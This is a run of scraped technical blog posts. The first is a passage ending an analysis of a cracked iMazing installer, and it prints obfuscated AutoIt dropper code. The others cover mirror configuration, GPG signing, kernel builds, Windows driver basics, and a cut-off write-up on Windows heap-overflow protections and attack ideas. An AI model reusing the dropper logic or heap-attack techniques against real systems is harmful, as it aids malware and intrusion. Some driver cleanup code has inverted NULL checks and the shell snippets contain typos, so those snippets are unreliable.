$a2f00001b21s1_ = a2f00001b21(\u0026#34;4054656D70446972\u0026#34;), $a2f00001b21s3_ = a2f00001b21(\u0026#34;31\u0026#34;), $a2f00001b21s4_ = a2f00001b21(\u0026#34;5c\u0026#34;), $a2f00001b21s5_ = a2f00001b21(\u0026#34;5c\u0026#34;), $a2f00001b21s6_ = a2f00001b21(\u0026#34;37\u0026#34;), $a2f00001b21s8_ = a2f00001b21(\u0026#34;3937\u0026#34;), $a2f00001b21s9_ = a2f00001b21(\u0026#34;313232\u0026#34;), $a2f00001b21s7_ = a2f00001b21(\u0026#34;31\u0026#34;), $a2f00001b21sa_ Local $a2f00001b21s2_ = Execute($a2f00001b21s1_) If StringRight($a2f00001b21s2_, Number($a2f00001b21s3_)) \u0026lt;\u0026gt; $a2f00001b21s4_ Then $a2f00001b21s2_ = $a2f00001b21s2_ \u0026amp; $a2f00001b21s5_ SRandom(Number(StringRight(TimerInit(), 0x4))) Do $a2f00001b21sa_ = \u0026#39;\u0026#39; While StringLen($a2f00001b21sa_) \u0026lt; Number($a2f00001b21s6_) $a2f00001b21sa_ = $a2f00001b21sa_ \u0026amp; Chr(Random(Number($a2f00001b21s8_), Number($a2f00001b21s9_), Number($a2f00001b21s7_))) WEnd $a2f00001b21sa_ = $a2f00001b21s2_ \u0026amp; $a2f00001b21sa_ Until Not FileExists($a2f00001b21sa_) Return ($a2f00001b21sa_) EndFunc ; -\u0026gt; a2f00001b21x_ Func a2f00001b21($a2f00001b21) Local $a2f00001b21_ For $x = 0x1 To StringLen($a2f00001b21) Step 0x2 $a2f00001b21_ \u0026amp;= Chr(Dec(StringMid($a2f00001b21, $x, 0x2))) Next Return $a2f00001b21_ EndFunc ; -\u0026gt; a2f00001b21 Conclusion It should do nothing but release an executable file, but the way this is released is really strange It finally released iMazing.exe is not a cracked version, things are even more strange ","date":"2021-09-27T13:56:01+08:00","permalink":"https://blog.moeomu.com/posts/analyze-imazing_tntcracked/","title":"Analyze iMazing_TNTCracked"},{"content":"Source: Moeomu\u0026rsquo;s blog\nInstallation Debain(Ubuntu, etc.)\n1 2 apt install node apt install yarn macOS\n1 2 brew install node brew install yarn Configure mirror source Set as Taobao mirror source 1 2 npm config set registry https://registry.npm.taobao.org/ yarn config set registry https://registry.npm.taobao.org/ Reset to official mirror source 1 2 npm config set registry https://registry.npmjs.org/ yarn config set registry https://registry.yarnpkg.com/ ","date":"2021-09-27T13:56:01+08:00","permalink":"https://blog.moeomu.com/posts/nodejs-mirror-source-configuration/","title":"NodeJS mirror source configuration"},{"content":"Source: Moeomu\u0026rsquo;s blog\nThe magnet trick Find two magnets and place them near the audio of the MacBook to trick the system into closing the lid to turn off the built-in screen.\nNVRAM boot setup method This method enables the screen to be displayed separately on the external screen from the driver level.\nEnable Reboot, press and hold Command+R key Enter the password to boot setup - terminal Enter the command nvram boot-args=\u0026quot;niog=1\u0026quot; Connect the external monitor, connect the power supply and reboot Close the cover immediately after booting by entering the user password, then see the external screen with a screen, open the cover of the MacBook, success Restore Reboot, press and hold Command+R key Enter the password to boot setup - terminal Enter the command nvram -d boot-args Reboot ","date":"2021-09-16T17:00:00+08:00","permalink":"https://blog.moeomu.com/posts/macos-turn-off-built-in-screen/","title":"macOS Turn off built-in screen"},{"content":"Source: Moeomu\u0026rsquo;s Blog\nPrepare the environment Ubuntu 20.04 LTS Linux 4.9.229 Busybox 1.33.0 qemu Download kernel source code and file system source code Download linux-4.9.229.tar.gz at the site Kernel.org. Download busybox-1.33.0.tar.bz2 from the site Busybox.net. Install qemu via apt: sudo apt install qemu-system-x86. Compilation Compiling the kernel export ARCH=x86。 make x86_64_defconfig。 make menuconfig。 Check General Settings -\u0026gt; Initial RAM file system and RAM disk (initramfs/initrd) support. Check Device Driver -\u0026gt; Block Devices -\u0026gt; RAM Block Device Support. Modify Device Driver -\u0026gt; Block Devices -\u0026gt; RAM Block Device Support -\u0026gt; (65536) default RAM disk size (kbytes). If this step reports a fatal error: curses.h, then install sudo apt install libncurses5-dev.\nThe compiled kernel is placed in the\nThe compiled kernel is placed in the directory arch/x86/boot under the file name bzImage.\nCompile busybox Compile busybox Check \u0026ldquo;Settings -\u0026gt; Build Options -\u0026gt; [*] Build Busybox as a static binary (no fragmented libraries)\u0026rdquo;. make \u0026amp;\u0026amp; make install。 Packaged file system mkdir etc dev mnt。\nmkdir -p proc sys tmp。\nmkdir -p etc/init.d。\nvim etc/fstab。\n1 2 3 proc /proc proc defaults 0 0 tmpfs /tmp tmpfs defaults 0 0 sysfs /sys sysfs defaults 0 0 vim etc/init.d/rcS\n1 2 3 4 5 6 7 8 echo -e \u0026#34;Welcome to Moeomu Linux\u0026#34; /bin/mount -a echo -e \u0026#34;Remounting the root filesystem\u0026#34; mount -o remount rw / mkdir -p /dev/pts moutn -t devpts devpts /dev/pts echo /sbin/mdev \u0026gt; /proc/sys/kernel/hotplug mdev -s chmod 755 etc/init.d/rcS\nvim etc/inittab\n1 2 3 4 ::sysinit:/etc/init.d/rcS ::respawn:-/bin/sh ::askfirst:-/bin/sh ::cttlaltdel:/bin/umount -a -r chmod 755 etc/inittab\ncd dev\nsudo mknod console c 5 1\nsudo mknod null c 1 3\nsudo mknod tty1 c 4 1\nThe following code is executed line by line in the busybox source code directory\n1 2 3 4 5 6 7 8 9 10 #!/bin/bash rm -rf rootfs.ext3 sudo rm -rf fs dd if=/dev/zero of=./rootfs.ext3 bs=1M count=32 mkfs.ext3 rootfs.ext3 mkdir fs sudo mount -o loop rootfs.ext3 ./fs sudo cp -rf ./_install/* ./fs sudo umount ./fs gzip --best -c rootfs.ext3 \u0026gt; rootfs.img.gz The final filesystem is generated: rootfs.img.gz\nRunning the system with QEMU qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage -initrd ./busybox-1.33.1/rootfs.img.gz -append \u0026quot;root=/dev/ram init=/linuxrc\u0026quot; -serial file:output.txt\nPreviews are as follows\n","date":"2021-07-07T11:20:00+08:00","permalink":"https://blog.moeomu.com/posts/linux-kernel-programming-study-notes-001-compiling-and-booting-kernel/","title":"Linux Kernel Programming study notes 001 Compiling and Booting Kernel"},{"content":"Source: Moeomu\u0026rsquo;s blog\nFirst update the kali source Ali cloud source is as follows 1 2 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib Error report content 1 2 3 4 5 6 An error occurred while installing the following packages: - libelf-dev - linux-headers-5.10.0-kali9-amd64 - dkms Install these packages manually and start the Parallels Tools installation again. Solution Install the missing package 1 2 sudo apt install dkms sudo apt intall libelf-dev Pitfall record.\nKali 2021\u0026rsquo;s default xfce desktop environment will cause a white screen after installing ParallelsTools, so switch the desktop environment to gnome in advance or deselect xface and select gnome when installing kali\n","date":"2021-07-06T15:55:00+08:00","permalink":"https://blog.moeomu.com/posts/parallelstools-error-on-high-version-kali/","title":"ParallelsTools error on high version Kali"},{"content":"Source: Moeomu\u0026rsquo;s Blog\nDownload GPG4WIN Download link: gpg4win\nCreate and apply GPG key Create GPG key Create: gpg --full-generate-key Key length: 4096 Enter username, email List all keys: gpg --list-secret-keys --keyid-format=long Export keys according to keyid: gpg --armor --export KEYID Apply the key Import the key into Github and Gitee Configure Git Windows Configure the default username and email, which needs to be the same as the values set when creating GPG git config --global user.name USERNAME git config --global user.email EMAIL Configure the key git config --global user.signingKey KEYID Enable global cryptographic signatures git config --global commit.gpgSign true ","date":"2021-06-05T08:50:00+08:00","permalink":"https://blog.moeomu.com/posts/signing-git-commit-with-gpg-on-windows/","title":"Signing Git Commit with GPG on Windows"},{"content":"Source: Moeomu\u0026rsquo;s Blog\nAbout GitHub GPG Key Verification Enabling Commit Signing GitHub has a new \u0026ldquo;Vigilance Mode\u0026rdquo; that requires a GPG key to sign a certified commit before it will show \u0026ldquo;Verity\u0026rdquo;.\nFirst create a GPG key (GitHub Official Docs generating-a-new-gpg-key) has details on how to do this, so I won\u0026rsquo;t go over it again) List the GPG key\u0026rsquo;s signature: gpg -K --keyid-format LONG, which will keyid record Tell git to use this GPG key: git config user.signingkey your_keyid The local git username and email need to be the same as the ones filled in when the GPG key was generated: git config user.name name, git config user.email email email Enable commit signing for local git: git config commit.gpgsign true Add the -S option to the Commit signature: git commit -S -m message Fatal error occurred - unable to commit-macOS The problem is as follows, reproduced in macOS 11.3.1 1 2 error: gpg failed to sign the data fatal: failed to write commit object solution in macOS Update \u0026amp; Install 1 2 3 4 5 6 7 8 brew upgrade gnupg # This has a make step which takes a while brew link --overwrite gnupg brew install pinentry-mac echo \u0026#34;pinentry-program /usr/local/bin/pinentry-mac\u0026#34; \u0026gt;\u0026gt; ~/.gnupg/gpg-agent.conf killall gpg-agent git config --global gpg.program gpg # perhaps you had this already? On linux maybe gpg2 git config --global commit.gpgsign true # if you want to sign every commit Sign again Check the status of the commit: git log --show-signature -1 ","date":"2021-05-25T07:55:00+08:00","permalink":"https://blog.moeomu.com/posts/using-gpg-to-sign-git-commit-under-macos/","title":"Using GPG to sign Git Commit under macOS"},{"content":"Source: Moeomu\u0026rsquo;s blog\nMention A little mention, Shanxi school enterprise pass the automatic clocking project after thinking about it will it decided to open source it, this is just a rush out of immature code, so there may be some reading difficulties, but the use will not have problems, but also has been stable operation for more than half a year, Readme I wrote all the use of methods and notes, the following is the open source address\n[Github]-XQT-Auto-Clockin\nFeatures Automatic clocking multi-user automatic clocking (to prevent the server is blocked IP set a delay clocking) No account password required, only ID number is needed My Way Seems to fall into depression more often, seems to be more and more difficult to control themselves, maybe should go to the hospital\n","date":"2021-05-24T10:36:00+08:00","permalink":"https://blog.moeomu.com/posts/dairy-2021-05-24/","title":"Dairy 2021-05-24"},{"content":"Source: Moeomu\u0026rsquo;s blog\nVSCode-Python-Venv-PowerShell unsigned environment can\u0026rsquo;t be activated I\u0026rsquo;ve been looking for a solution for a while, but the solution is to change the Windows security policy to a signed one, as follows\nset-executionpolicy remotesigned I found that this is a 2018 problem and there is no good solution, but I still found a good policy that changes the current user\u0026rsquo;s signature policy to require remote signing, while other users are still blocked\nSet-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser You can then view the policy changes with the following code\nGet-ExecutionPolicy -LIST Python change PIP source It\u0026rsquo;s too much trouble to search for the source every time, so why not just take a note and back it up locally?\nWindows %HOMEPATH%/pip/pip.ini\nLinux \u0026amp; macOS ~/.pip/pip.conf\nEdit format 1 2 3 4 [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=pypi.tuna.tsinghua.edu.cn pip source Site Source Tsinghua https://pypi.tuna.tsinghua.edu.cn/simple Ali Cloud http://mirrors.aliyun.com/pypi/simple/ USTC https://pypi.mirrors.ustc.edu.cn/simple/ HUT http://pypi.hustunique.com/ SUT http://pypi.sdutlinux.org/ DouBan http://pypi.douban.com/simple/ pip module not found error python -m ensurepip python -m pip install --upgrade pip ","date":"2021-01-19T17:48:00+08:00","permalink":"https://blog.moeomu.com/posts/summary-of-the-problem-of-writing-python-with-vscode-under-windows/","title":"Summary of the problem of writing python with vscode under Windows"},{"content":"Source: Moeomu\u0026rsquo;s blog\nString manipulation The UNICODE_STRING structure is used in the kernel as the basic string structure. It should be noted that the lenth member of this structure is used to determine the string length, not '\\0'.\nString initialization Function: RtlInitUnicodeString Parameters. PUNICODE_STRING: DestinationString PCWSTR: SourceString Return value: None IRQL: \u0026lt;=DISPATCH_LEVEL Explanation: Initialize a WCHAR string ending with 0, the first parameter is the input parameter and also the output parameter 1 2 3 UNICODE_STRING uFirstString = {0}; RtlInitUnicodeString(\u0026amp;uFirstString, L\u0026#34;HelloWorld\\n\u0026#34;); DbgPrint(\u0026#34;String:%wZ\u0026#34;, \u0026amp;uFirstString); ps: it does not allocate space for buffer, but points directly to Source first address, so make sure Source is always valid, otherwise it is invalid access\nString Copy Function: RtlUnicodeStringCopyString Parameters PUNICODE_STRING: DestinationString NTSTRSAFE_PCWSTR: pszSrc Return value: NTSTAUTS Successful execution returns STATUS_SUCCESS IRQL: =PASSIVE_LEVEL Explanation: Copy a copy of src to dest 1 2 3 4 5 WCHAR strBuf[128] = {0}; UNICODE_STRING uFirstString = {0}; RtlInitEmptyUnicodeString(\u0026amp;uFirstString, strBuf, sizeof(strBuf)); RtlUnicodeStringCopyString(\u0026amp;uFirstString, L\u0026#34;Hello Kernel\\n\u0026#34;); DbgPrint(\u0026#34;String: %wZ\u0026#34;, \u0026amp;uFirstString); PS: In order to use the RtlUnicodeStringCopyString function, you should add the header file Ntstrsafe.h; you can\u0026rsquo;t copy to the String with fixed length buf, otherwise you will blue screen report memory read/write error\nChain table Definition of a linked table The following is the definition of a linked table in wdk\n1 2 3 4 5 typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; // 后节点 struct _LIST_ENTRY *Blink; // 前节点 } LIST_ENTRY, *PLIST_ENTRY; Using linked tables 1 2 3 4 5 6 7 8 typedef struct _TestListEntry { ULONG m_ulData1; ULONG m_ulData2; LIST_ENTRY m_ListEntry; ULONG m_ulData3; ULONG m_ulData4; } Generally, for ease of operation, a header node of a chain table is defined, containing nothing but a LIST_ENTRY structure. Header node initialization 1 2 LIST_ENTRY ListHeader = {0}; InitializeListHead(\u0026amp;ListHeader); Node insertion 1 2 3 4 5 6 7 8 9 10 11 12 13 LIST_ENTRY ListHeader = {0}; TestListEntry Entry1 = {0}; TestListEntry Entry2 = {0}; TestListEntry Entry3 = {0}; Entry1.m_ulData1 = \u0026#39;A\u0026#39;; Entry2.m_ulData1 = \u0026#39;B\u0026#39;; Entry3.m_ulData1 = \u0026#39;C\u0026#39;; InitializeListHead(\u0026amp;ListHeader); InsertHeadList(\u0026amp;ListHeader, \u0026amp;Entry2.m_ListEntry); InsertHeadList(\u0026amp;ListHeader, \u0026amp;Entry1.m_ListEntry); InsertTailList(\u0026amp;ListHeader, \u0026amp;Entry3.m_ListEntry); Link table traversal 1 2 3 4 5 6 7 8 PLIST_ENTRY pListEntry = NULL; pListEntry = ListHeader.Flink; while(pListEntry != \u0026amp;ListHeader) { PTestListEntry pTestEntry = CONTAINING_RECORD(pListEntry, TestListEntry, m_ListEntry); DbgPrint(\u0026#34;ListPtr=%p, Entry=%p, Tag=%c\\n\u0026#34;, pListEntry, pTestEntry, (CHAR)pTestEntry-\u0026gt;m_ulData1); pListEntry = pListEntry-\u0026gt;Flink; } The role of CONTAINING_RECORD is to convert the address of m_ListEntry to the first address of the structure TestListEntry. CONTAINING_RECORD usage: CONTAINING_RECORD(PCHAR Address, TYPE Type, PCHAR Field) Node Removal Remove the first node: PLIST_ENTRY RemoveHeadList(PLIST_ENTRY ListHead) Remove the tail node: PLIST_ENTRY RemoveTailList(PLIST_ENTRY ListHead) If successful, both of the above functions will return the address of the head of the chain, or NULL if they cannot be removed To remove a specific node. BOOLEAN RemoveEntryList(PLIST_ENTRY Entry) If the chain becomes empty after removal, then TRUE will be returned, if it is not empty, then FALSE will be returned Determine the state of the linked list BOOLEAN IsListEmpty(const LIST_ENTRY *ListHead) It returns TRUE to indicate an empty linked table, otherwise it means the chain is non-empty Spin locks Using spin locks A spinlock is a high IRQL lock provided by the kernel to access a resource in a synchronous and exclusive manner\nCaution.\nThe spinlock variable cannot be stored on the current function stack, otherwise it is the same as not initializing it every time you enter it Initializing/using spin locks 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // Initialize Spin Lock WARN: not local var KSPIN_LOCK my_spin_lock; void initLock() { KeInitializeSpinLock(\u0026amp;my_spin_lock); } void TestFuncLock() { // it\u0026#39;s a safe function // Acquire Lock KIRQL irql; // save old irql // Normal Spin Lock KeAcquireSpinLock(\u0026amp;my_spin_lock, \u0026amp;irql); // TO DO KeReleaseSpinLock(\u0026amp;my_spin_lock, irql); } Spin locks are used in bidirectional linked tables 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void TestFuncLock() { // it\u0026#39;s a safe function DbgPrint(\u0026#34;[%ws] Enter...\\n\u0026#34;, __FUNCTIONW__); // Acquire Lock KIRQL irql; // save old irql // Normal Spin Lock KeAcquireSpinLock(\u0026amp;my_spin_lock, \u0026amp;irql); // Test List typedef struct _FILE_INFO { LIST_ENTRY m_ListEntry; UNICODE_STRING m_strFileName; }FILE_INFO, *PFILE_INFO; LIST_ENTRY listHead; FILE_INFO my_file_info; RtlInitUnicodeString(\u0026amp;my_file_info.m_strFileName, L\u0026#34;TestName\u0026#34;); InitializeListHead(\u0026amp;listHead); ExInterlockedInsertHeadList(\u0026amp;listHead, \u0026amp;my_file_info.m_ListEntry, \u0026amp;my_spin_lock); KeReleaseSpinLock(\u0026amp;my_spin_lock, irql); } Queue spinlock Queue spinlock can have better performance on multi-CPU platforms, and also follows the first-wait-first-acquire spinlock principle.\nIt is initialized in the same way as a normal spinlock, but the initialized spinlocks must not be mixed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 KSPIN_LOCK my_spin_lock; void initLock() { KeInitializeSpinLock(\u0026amp;my_spin_lock); } void TestFuncLock() { // it\u0026#39;s a safe function // Acquire Lock KIRQL irql; // save old irql // Queue Spin Lock KLOCK_QUEUE_HANDLE my_lock_queue_handle; KeAcquireInStackQueuedSpinLock(\u0026amp;my_spin_lock, \u0026amp;my_lock_queue_handle); KeReleaseInStackQueuedSpinLock(\u0026amp;my_lock_queue_handle); } Memory allocation General memory allocation 1 2 3 4 5 6 7 8 9 10 11 12 13 void TestFuncMem() { PVOID buffer = ExAllocatePoolWithTag(NonPagedPoolNx, 512, \u0026#39;tag1\u0026#39;); if (buffer) { ExFreePoolWithTag(buffer, \u0026#39;tag1\u0026#39;); DbgPrint(\u0026#34;[%ws] Pool Operate Success!\\n\u0026#34;, __FUNCTIONW__); } else { DbgPrint(\u0026#34;[%ws] Allocate Pool Failed!\\n\u0026#34;, __FUNCTIONW__); } } Lookaside Memory Allocation Benefits: High frequency of memory requests and releases from the system, using Lookaside allocation will greatly improve performance\nNote: In some places it is called \u0026ldquo;LookAside\u0026rdquo;. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 void TestFuncMemLookaside() { PNPAGED_LOOKASIDE_LIST pLookAsideList = NULL; BOOLEAN bSucc = FALSE; BOOLEAN bInit = FALSE; PVOID pFirstMemory = NULL; PVOID pSeocdeMemory = NULL; do { pLookAsideList = (PNPAGED_LOOKASIDE_LIST)ExAllocatePoolWithTag(NonPagedPoolNx, sizeof(NPAGED_LOOKASIDE_LIST), \u0026#39;test\u0026#39;); if (pLookAsideList == NULL) { break; } memset(pLookAsideList, 0, sizeof(NPAGED_LOOKASIDE_LIST)); // init ExInitializeNPagedLookasideList(pLookAsideList, NULL, NULL, 0, 128, \u0026#39;test\u0026#39;, 0); bInit = TRUE; // start allocate pFirstMemory = ExAllocateFromNPagedLookasideList(pLookAsideList); if (pFirstMemory == NULL) { break; } pSeocdeMemory = ExAllocateFromNPagedLookasideList(pLookAsideList); if (pSeocdeMemory == NULL) { break; } DbgPrint(\u0026#34;[%ws] First Address:%p, Second Address:%p\\n\u0026#34;, __FUNCTIONW__, pFirstMemory, pSeocdeMemory); // free first ExFreeToNPagedLookasideList(pLookAsideList, pFirstMemory); pFirstMemory = NULL; // reallocate pFirstMemory = ExAllocateFromNPagedLookasideList(pLookAsideList); if (pFirstMemory == NULL) { break; } DbgPrint(\u0026#34;[%ws] Re-Allocate First Address:%p\\n\u0026#34;, __FUNCTIONW__, pFirstMemory); bSucc = TRUE; } while (FALSE); if (pFirstMemory != NULL) { ExFreeToNPagedLookasideList(pLookAsideList, pFirstMemory); pFirstMemory = NULL; } if (pSeocdeMemory != NULL) { ExFreeToNPagedLookasideList(pLookAsideList, pSeocdeMemory); pSeocdeMemory = NULL; } if (bInit == TRUE) { ExDeleteNPagedLookasideList(pLookAsideList); bInit = FALSE; } if (pLookAsideList != NULL) { ExFreePoolWithTag(pLookAsideList, \u0026#39;test\u0026#39;); pLookAsideList = NULL; } } Objects and handles Objects created in the kernel, destroyed in the kernel, and managed and maintained by the kernel are called kernel objects\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 void TestFuncObject() { BOOLEAN bSucc = FALSE; HANDLE hCreateEvent = NULL; PVOID pCreateEventObject = NULL; HANDLE hOpenEvent = NULL; PVOID pOpenEventObject = NULL; do { OBJECT_ATTRIBUTES ObjAttr = { 0 }; UNICODE_STRING uNameString = { 0 }; RtlInitUnicodeString(\u0026amp;uNameString, L\u0026#34;\\\\BaseNamedObjects\\\\TestEvent\u0026#34;); InitializeObjectAttributes(\u0026amp;ObjAttr, \u0026amp;uNameString, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); ZwCreateEvent(\u0026amp;hCreateEvent, EVENT_ALL_ACCESS, \u0026amp;ObjAttr, SynchronizationEvent, FALSE); if (hCreateEvent == NULL) { break; } // get point ObReferenceObjectByHandle(hCreateEvent, EVENT_ALL_ACCESS, *ExEventObjectType, KernelMode, \u0026amp;pCreateEventObject, NULL); if (pCreateEventObject == NULL) { break; } // open obj with attribute:name ZwOpenEvent(\u0026amp;hOpenEvent, EVENT_ALL_ACCESS, \u0026amp;ObjAttr); if (hOpenEvent == NULL) { break; } ObReferenceObjectByHandle(hOpenEvent, EVENT_ALL_ACCESS, *ExEventObjectType, KernelMode, \u0026amp;pOpenEventObject, NULL); if (pOpenEventObject == NULL) { break; } DbgPrint(\u0026#34;[%ws] Create Handle:%p, Create Object Address:%p\\n\u0026#34;, __FUNCTIONW__, hCreateEvent, pCreateEventObject); DbgPrint(\u0026#34;[%ws] Open Handle:%p, Open Object Address:%p\\n\u0026#34;, __FUNCTIONW__, hOpenEvent, pOpenEventObject); bSucc = TRUE; } while (FALSE); if (pCreateEventObject == NULL) { ObDereferenceObject(pCreateEventObject); pCreateEventObject = NULL; } if (hCreateEvent == NULL) { ZwClose(hCreateEvent); hCreateEvent = NULL; } if (pOpenEventObject == NULL) { ObDereferenceObject(pOpenEventObject); pOpenEventObject = NULL; } if (hOpenEvent == NULL) { ZwClose(hOpenEvent); hOpenEvent = NULL; } } PS: there is a conflict when importing header files: ntddk.h and ntifs.h, the solution is to put ntifs.h in front of ntddk.h and import it, so there is no conflict\nRegistry The registry is actually the configuration storage structure of Windows, storing most of the system configuration information, most of the files are stored in the SYSTEM32\\CONFIG directory under the system disk, these files are stored in the kernel space in a memory-mapped way, and then organized in the way of \u0026ldquo;HIVE\u0026rdquo;. The registry API actually manipulates the HIVE memory data, which is eventually written back to the corresponding file in the config directory\nOpen and close To be continued ","date":"2020-12-18T20:52:00+08:00","permalink":"https://blog.moeomu.com/posts/windows-kernel-programming-study-notes-002-basic-structure/","title":"Windows Kernel Programming Study Notes 002 Basic Structure"},{"content":"Source: Moeomu\u0026rsquo;s blog\nWindows kernel development environment configuration Download Development Machine\nWindows 10 20H2 x64 Visual Studio 2019 Windows Driver Kit - Windows 10.0.19041.685 (Windows 10 2004) WinDbg Preview Test Machine\nWindows 10 2004 x64 DbgView Test driver Let\u0026rsquo;s start with the classic HelloWorld\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;ntddk.h\u0026gt; VOID DriverUnload(PDRIVER_OBJECT DriverObject) { DbgPrint(\u0026#34;[%ws] Driver Unload, Driver Object Address: %p\\n\u0026#34;, __FUNCTIONW__, DriverObject); } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { DbgPrint(\u0026#34;[%ws] Hello Kernel World!\\n\u0026#34;, __FUNCTIONW__); if (DriverObject != NULL) { DbgPrint(\u0026#34;[%ws] Driver Object Address: %p\\n\u0026#34;, __FUNCTIONW__, DriverObject); DriverObject-\u0026gt;DriverUnload = DriverUnload; } if (RegistryPath != NULL) { DbgPrint(\u0026#34;[%ws] Driver Registry Path: %wZ\\n\u0026#34;, __FUNCTIONW__, RegistryPath); } return STATUS_SUCCESS; } Test debugging Refer to Windows kernel debugging article to set up the debugging environment, except that the place of Windows 7 can be changed to Windows 10\nContextual environment analysis Context refers to the environment and state that the CPU is in when executing the code and changing the code.\nExperiment: PsGetCurrentProcessId The purpose of the experiment is to find out in which \u0026ldquo;process\u0026rdquo; the written driver module is executed\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;ntddk.h\u0026gt; VOID DriverUnload(PDRIVER_OBJECT DriverObject) { DbgPrint(\u0026#34;[%ws] Driver Unload, Driver Object Address: %p, Current Process Id=0x%p\\n\u0026#34;, __FUNCTIONW__, DriverObject, PsGetCurrentProcessId()); } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { DbgPrint(\u0026#34;[%ws] Hello Kernel World, Current Process Id=0x%p\\n\u0026#34;, __FUNCTIONW__, PsGetCurrentProcessId()); if (DriverObject != NULL) { DbgPrint(\u0026#34;[%ws] Driver Object Address: %p\\n\u0026#34;, __FUNCTIONW__, DriverObject); DriverObject-\u0026gt;DriverUnload = DriverUnload; } if (RegistryPath != NULL) { DbgPrint(\u0026#34;[%ws] Driver Registry Path: %wZ\\n\u0026#34;, __FUNCTIONW__, RegistryPath); } return STATUS_SUCCESS; } As shown Conclusion Both the driver entry function and the driver uninstall callback function belong to the process with ID 4, and this process is the System process\nSystem process is a process virtualized by the operating system, representing the system kernel If process A is running in P1 virtual space and the current CPU context of the driver is P2 virtual space, then the accessed content should be unpredictable Interrupt request level Similar to the concept of priority of threads, the system scheduler schedules threads at the granularity of time slice, based on their priority, the higher the thread priority, the higher the chance of getting scheduled. And at the driver level, the CPU provides the concept of IRQL, which stipulates that code at high IRQL level can interrupt and preempt the execution process of code at low IRQL to execute.\nTable of common IRQL interrupt request levels IRQL Value(x86, amd64, IA64) Description PASSIVE_LEVEL 0, 0, 0 Application layer threads and most kernel functions are in this IRQL, with unlimited access to all kernel APIs, paged and non-paged memory APC_LEVEL 1, 1, 1 Asynchronous method calls (APC), or being in this IRQL on page errors, can use most of the kernel APIs and can access paged as well as non-paged memory DISPATCH_LEVEL 2, 2, 2 Deferred method calls (DPCs) are in this IRQL, can use specific kernel APIs, and can only access non-paged memory Determine the current IRQL At the driver entry point DriverEntry, IRQL is PASSIVE_LEVEL, which is guaranteed by the system Get the current IRQL by calling KeGetCurrentIrql function As shown in the figure, the IRQL are 0, against the above table, the level is PASSIVE_LEVEL Conclusion Before calling a certain function first read the function description document and carefully observe what the IRQL level of the safe calling function is, so as to achieve safe programming Driver exceptions When developing a driver, if the driver code is not written in compliance with the situation that triggers a system crash, manifested as a blue screen (BSOD).\nCommon causes High IRQL deadlock Memory access violation Function stack imbalance Active blue screen triggered Blue screen can be triggered proactively using KeBugCheckEx function Conclusion Proactively raising a blue screen in case of unpredictable errors in code can reduce further expansion of the error ","date":"2020-12-18T18:52:00+08:00","permalink":"https://blog.moeomu.com/posts/windows-kernel-programming-study-notes-001-environment-building/","title":"Windows Kernel Programming Study Notes 001 Environment Building"},{"content":"Source: Moeomu\u0026rsquo;s blog\nPrelude Works under macOS Big Sur Previously it was an imperfect solution using command start, which would also lead to a series of permission problems, but now it is finally perfect Solution Edit the file /Library/Preferences/Parallels/network.desktop.xml with highest privileges Change the value of the UseKextless field from -1 to 0 Note: This value may not be -1 for everyone, and may not be 0 for everyone, so be brave and try!\n","date":"2020-12-16T13:42:00+08:00","permalink":"https://blog.moeomu.com/posts/parallelsdesktop16-repair-network/","title":"ParallelsDesktop16 repair network"},{"content":"Source: Moeomu\u0026rsquo;s blog\nIntroduction PEB Random: Microsoft no longer uses a fixed PEB base address 0x7ffdf000 after Windows XP SP2, but a PEB base address with some randomness. the PEB randomization mainly affects attacks on functions in the PEB, and function pointers in the PEB are excellent targets when DWORD SHOOT. Moving the PEB base address will make such attacks more difficult to some extent. See heap overflow exploitation and Attacking function pointers in the PEB of the related introduction SafeUnlink: Microsoft has rewritten the code for manipulating bidirectional chained tables to be more careful when unloading heap blocks in free list. Compare to heap overflow exploit-DWORD SHOOT for the description of the bi-directional chained table disassembly problem, the chain table disassembly operation before SP2 was similar to the following code. 1 2 3 4 5 6 int remove(ListNode * node) { node -\u0026gt; blink -\u0026gt; flink = node -\u0026gt; flink; node -\u0026gt; flink -\u0026gt; blink = node -\u0026gt; blink; return 0; } SP2 will verify the integrity of the heap block forward and backward pointers in advance when performing a delete operation to prevent DWORD SHOOT. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int safe_remove(ListNode * node) { if((node-\u0026gt;blink-\u0026gt;flink == node) \u0026amp;\u0026amp; (node-\u0026gt;flink-\u0026gt;blink == node)) { node -\u0026gt; blink -\u0026gt; flink = node -\u0026gt; flink; node -\u0026gt; flink -\u0026gt; blink = node -\u0026gt; blink; return 1; } else { // 链表指针被破坏，进入异常 return 0; } } heap cookie: similar to the security cookie in the stack, Microsoft has introduced a cookie in the heap to detect the occurrence of heap overflows. cookies are placed at the location of the segment table of the original heap block at the head of the heap and occupy a size of 1 byte Metadata encryption: Microsoft started using this security measure in Windows Vista and subsequent versions of the operating system. Some important data in the head of the block will be saved with a 4-byte random number to perform an iso operation, when using these data need to perform another iso run to restore, so that we can not directly destroy these data to protect the heap. Attack ideas Attacking the variables stored inside the heap This is a way to achieve overflow by attacking function pointers stored in the heap or something like that, but 